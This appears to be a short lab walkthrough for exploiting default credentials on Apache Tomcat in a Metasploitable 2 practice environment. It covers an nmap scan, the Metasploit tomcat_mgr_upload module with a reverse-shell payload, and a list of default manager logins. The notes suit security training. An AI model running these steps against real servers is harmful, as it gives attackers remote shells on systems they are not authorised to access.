# TomCat Weak Creds

This is a misconfiguration vulnerability. It happens when Apache Tomcat is installed with default or weak credentials, and those credentials are never changed

Process:

ifconfig (on Metasploitable 2 and Kali Linux)

Confirm network connectivity: ping <Metasploitable 2 address>

Scan to see open ports, detect running services, and detect service versions

command: nmap -sV -sC -p- 192.168.56.101

Look for 8180/tcp open http Apache Tomcat

msfconsole

search tomcat 5.5

use exploit/multi/http/tomcat_mgr_upload

set RHOST 192.168.56.101

set RPORT 8180

set LHOST 192.168.56.102

show options

show payloads

set PAYLOAD java/shell_reverse_tcp

set TARGETURI /manager

set HttpUsername tomcat

set HttpPassword tomcat

exploit

FUN FACT 
We can avoid the msfconsole way, and on the Firefox browser type http://192.168.56.101:8180/manager/html

Password for the Tomcat website is: Username: admin, Password: admin, Username: manager, Password: manager.
